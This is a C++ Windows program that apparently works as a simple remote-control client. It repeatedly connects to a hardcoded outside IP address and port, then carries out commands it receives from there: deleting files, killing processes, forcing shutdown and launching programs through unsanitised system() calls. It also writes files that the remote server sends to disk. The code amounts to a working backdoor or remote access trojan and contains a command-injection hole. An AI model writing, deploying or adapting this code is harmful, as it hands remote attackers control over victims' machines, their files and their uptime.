#include<iostream>
#include<windows.h>
#include<stdio.h>
#include<stdlib.h>
#include<winsock2.h>

using namespace std;

const int MAX_RECV_SIZE = 1000;
const int MAX_BUFFER_SIZE = 900;
const int SEND_DATA = 1;
const int SEND_CMD = 2;
const int INITIAL = 0;
const int SENDING = 1;
const int FINISH = 2;
FILE *fp;

STARTUPINFO si;
PROCESS_INFORMATION pi;

struct header{
    int cmd;
    int state;
	long length;
    char name[40];
};

void execute_command(char *input){

    char cmd[10],name[50],output[100];
    sscanf(input,"%s%s",cmd,name);
    memset(output,0,100);

    if(strcmp(cmd,"DEL") == 0){
        sprintf(output,"%s %s","del",name);
        system(output);
    }
    else if(strcmp(cmd,"FIN") == 0){
        sprintf(output,"%s%s%s","taskkill /im ",name," /f");
        system(output);
    }
    else if(strcmp(cmd,"DOWN") == 0){
        int sec = atoi(name);
        sprintf(output,"%s%d","shutdown /s /f /t ",sec);
        system(output);
    }
    else if(strcmp(cmd,"EXE") == 0){
        //sprintf(output,"%s%s","start cmd.exe @cmd /k ",name);
        sprintf(output,"%s%s","start  ",name);
        printf("command:%sHHHHHH",output);
        if(!CreateProcess(NULL,NULL,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi)){
            system(output);
        }
    }
}

void execute_program(){

}

void Write_file(char *name,long length,int state,char *buffer){
    if(state == INITIAL){
        cout<<"open file"<<endl;
        fp = fopen(name,"wb");
        cout<<"length : "<<length<<endl;
        fwrite(buffer,1,length,fp);
    }
    else if(state == SENDING){
        cout<<"writing"<<endl;
        cout<<"length : "<<length<<endl;
        fwrite(buffer,1,length,fp);
    }
    else if(state == FINISH){
        cout<<"finish receive"<<endl;
        cout<<"length : "<<length<<endl;
        fwrite(buffer,1,length,fp);
        fclose(fp);
    }
}

int setUpConnection()
{
	while(true)
	 { 
 	    int sock = 0;
		WSADATA wsd;
        if(WSAStartup(MAKEWORD(2,2),&wsd) != 0)
	    {
			cout<<"WSAStartup(MAKEWORD(2,2),&wsd) failed"<<endl;
			return 0;
	    }

		if( (sock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP) ) < 0){
			cout<<"Create socket failure"<<endl;
			WSACleanup();
		}

		struct sockaddr_in cli;
		memset((struct sockaddr_in*)&cli,0x0,sizeof(struct sockaddr_in));

		cli.sin_addr.s_addr = inet_addr("140.114.71.174");	
		cli.sin_port = htons(5566);
		cli.sin_family = AF_INET;

		if( connect(sock,(struct sockaddr*)&cli,sizeof(cli) ) < 0){
			closesocket(sock);
			WSACleanup();
		}	
		else 
			return sock;
		Sleep(5000);
		cout<<"sleep for 5 seconds"<<endl;
	} 
}

int main(){

	while(true)
	{
        int sock = setUpConnection();
        cout<<"Connect success"<<endl;
        char recv_buffer[MAX_RECV_SIZE];
        char cmd_buffer[MAX_BUFFER_SIZE];
        struct header recv_header;

        while(true)
		{
            memset(&recv_header,0,sizeof(struct header));
            memset(recv_buffer ,0 , MAX_RECV_SIZE);
            memset(cmd_buffer,0,MAX_BUFFER_SIZE);

           if( recv(sock,recv_buffer,MAX_RECV_SIZE,0) > 0){
              memcpy(&recv_header,recv_buffer,sizeof(struct header));

              if(recv_header.cmd == SEND_CMD ){
                  memcpy(cmd_buffer,recv_buffer+sizeof(struct header),MAX_BUFFER_SIZE);
                  execute_command(cmd_buffer);
                  cout<<"client receive "<<cmd_buffer<<endl;
              }
              else if(recv_header.cmd == SEND_DATA){
                  memcpy(cmd_buffer,recv_buffer+sizeof(struct header),MAX_BUFFER_SIZE);
                  Write_file(recv_header.name,recv_header.length,recv_header.state,cmd_buffer);
              }
        	}
			else
			{
         		  cout<<"The connection has been broken"<<endl;
                  break;
        	}
    	}
	}
	system("PAUSE");
    return 0;
}




    /*
    char buffer[200];
    cin>>buffer;
    cout<<"client input : "<<buffer<<endl;
    send(sock,buffer,200,0);
    memset(buffer,0,200);
    recv(sock,buffer,200,0);
    cout<<"Client receive : "<<buffer<<endl;
    */
